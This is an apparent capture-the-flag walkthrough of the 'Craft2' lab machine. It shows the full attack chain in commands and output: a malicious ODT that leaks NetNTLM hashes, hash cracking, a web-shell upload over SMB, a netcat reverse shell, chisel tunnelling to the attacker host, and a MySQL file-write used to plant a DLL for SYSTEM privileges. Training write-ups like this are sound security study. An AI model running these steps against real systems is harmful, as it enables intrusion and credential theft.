# Craft2

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.188
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 23:51 +08
Nmap scan report for 192.168.197.188
Host is up (0.17s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
49666/tcp open  unknown
```

This is a continuation of the original Craft machine, and it appears that SMB is open for this machine. The last machine was pretty minimalist, so I think we might need this later.&#x20;

### ODT Macro Fail --> NTLM Steal

The website is largely the same as the previous one. However, when we try to upload a ODT file, we get some additional information:

<figure><img src="../../../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>

It appears that macros will not work again. Since SMB is open on this machine, I googled 'LibreOffice SMB Exploit' and this was the first result:

{% embed url="https://vuldb.com/?id.117265" %}

There was a public exploit available for it, and I found that rather interesting. Using `searchsploit` returns the exploit PoC:

```
$ searchsploit libreoffice information disclosure
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
LibreOffice/Open Office - '.odt' Information Disclosure    | windows/local/44564.py
----------------------------------------------------------- ---------------------------------
```

When using it, it states that we can steal NetNTLM creds using this:

```
$ python2 44564.py 

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/
/_____/\__,_/\__,_/      \____/_____/_/


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
www.secureyourit.co.uk


Please enter IP of listener: 192.168.45.197
```

The script also generates the file `bad.odt` for us to upload. I started a `responder` instance and uploaded the file. After a while, `responder` would capture a hash:

<figure><img src="../../../.gitbook/assets/image (1308).png" alt=""><figcaption></figcaption></figure>

This hash can be cracked immediately to get the password for the user:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
winniethepooh    (thecybergeek)     
1g 0:00:00:00 DONE (2023-07-05 23:58) 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

### SMB Shares --> Upload Web Shell

There wasn't SSH or WinRM open on the system, so instead, let's try to enumerate SMB using these credentials.

`smbmap` reveals that we can read some shares:

```
$ smbmap -u thecybergeek -p winniethepooh -H 192.168.197.188     
[+] IP: 192.168.197.188:445     Name: 192.168.197.188                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        WebApp                                                  READ ONLY
```

The WebApp one looked like the next stage. We can connect to it and view the files:

```
$ smbclient -U thecybergeek //192.168.197.188/WebApp        
Password for [WORKGROUP\thecybergeek]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  6 00:16:03 2022
  ..                                  D        0  Wed Apr  6 00:16:03 2022
  assets                              D        0  Wed Apr  6 00:16:03 2022
  css                                 D        0  Wed Apr  6 00:16:03 2022
  index.php                           A     9768  Tue Feb  1 00:21:52 2022
  js                                  D        0  Wed Apr  6 00:16:03 2022
  upload.php                          A      896  Mon Jan 31 23:23:02 2022
  uploads                             D        0  Wed Jul  5 23:57:54 2023
```

The previous machine Craft allowed us to upload webshells to the web directory, and it works here too:

```
smb: \> put cmd.php
putting file cmd.php as \cmd.php (0.1 kb/s) (average 0.1 kb/s)

$ curl http://192.168.197.188/cmd.php?cmd=whoami
craft2\apache
```

We can then easily get a reverse shell by downloading `nc.exe` onto the machine and executing it.&#x20;

<figure><img src="../../../.gitbook/assets/image (2027).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

This time, the `apache` user had no abusable privileges, and there was nothing much about the current user.

### RunasCs.exe --> Lateral Movement Fail

We still had `thecybergeek` password, and this is abusable using `RunasCs.exe`.&#x20;

{% embed url="https://github.com/antonioCoco/RunasCs" %}

```
C:\xampp\htdocs>.\RunasCs.exe thecybergeek winniethepooh "whoami"     
.\RunasCs.exe thecybergeek winniethepooh "whoami"
craft2\thecybergeek

C:\xampp\htdocs>.\RunasCs.exe thecybergeek winniethepooh "whoami /priv"
.\RunasCs.exe thecybergeek winniethepooh "whoami /priv"

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

The user had nothing interesting though.

### MySQL Arbitrary Write --> WerTrigger

I checked the ports open on the machine, and found quite a few such as HTTPS and MySQL not publicly facing:

```
C:\xampp\htdocs>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2376
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       880
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2376
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       2004
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       516
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       388
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1132
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       652
```

Interesting. We can forward this using `chisel.exe`.&#x20;

```bash
## on kali
chisel server -p 6000 --reverse

## on victim
chisel.exe client 192.168.45.197:6000 R:3306:127.0.0.1:3306
```

Then, we can access the MySQL database:

```
$ mysql -h 127.0.0.1 -uroot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9
Server version: 10.4.19-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

However, there was literally nothing in the database. Instead, let's view our privileges:

```
MariaDB [test]> show grants;
+---------------------------------------------------------------------+
| Grants for root@localhost                                           |
+---------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` WITH GRANT OPTION |
| GRANT PROXY ON ''@'%' TO 'root'@'localhost' WITH GRANT OPTION       |
+---------------------------------------------------------------------+
```

We seem to have **all privileges** enabled on the machine, and we can also read all files on the machine:

```
MariaDB [mysql]> select load_file('C:/Users/Administrator/Desktop/proof.txt');
+-------------------------------------------------------+
| load_file('C:/Users/Administrator/Desktop/proof.txt') |
+-------------------------------------------------------+
| <REDACTED>
                    |
+-------------------------------------------------------+
```

This was interesting, because it confirmed that we are running MySQL as the Administrator. However, we cannot execute commands as the `exec` module is just not present within the machine:

```
MariaDB [mysql]> select * from mysql.func;
Empty set (0.176 sec)
```

Since we can use `load_file`, this means we can also move files all over the place, giving us privileged file write over the machine:

{% code overflow="wrap" %}
```
MariaDB [mysql]> select load_file('C:/Users/Administrator/Desktop/proof.txt') into dumpfile "C:\\root.txt"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3690).png" alt=""><figcaption></figcaption></figure>

This opens up quite a few exploits to getting an administrator shell, such as the WerTrigger exploit.

{% embed url="https://github.com/sailay1996/WerTrigger" %}

&#x20;To exploit this, we would need to have these files within a directory we control:

```
C:\temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\temp

07/05/2023  09:25 AM    <DIR>          .
07/05/2023  09:25 AM    <DIR>          ..
07/05/2023  09:25 AM            45,272 nc.exe
07/05/2023  09:23 AM            12,288 phoneinfo.dll
07/05/2023  09:24 AM             9,252 Report.wer
07/05/2023  09:24 AM            15,360 WerTrigger.exe
               4 File(s)         82,172 bytes
               2 Dir(s)   7,268,442,112 bytes free
```

Afterwards, using the MySQL instance, we can place the `phoneinfo.dll` file into `C:\Windows\System32`.&#x20;

```
MariaDB [mysql]> select load_file('C:/temp/phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll"
    -> ;
Query OK, 1 row affected (0.176 sec)
```

Afterwards, just run `WerTrigger.exe` and our reverse shell command:

<figure><img src="../../../.gitbook/assets/image (1170).png" alt=""><figcaption></figcaption></figure>

This would execute the command as the SYSTEM user:

<figure><img src="../../../.gitbook/assets/image (1810).png" alt=""><figcaption></figcaption></figure>

Interesting root!
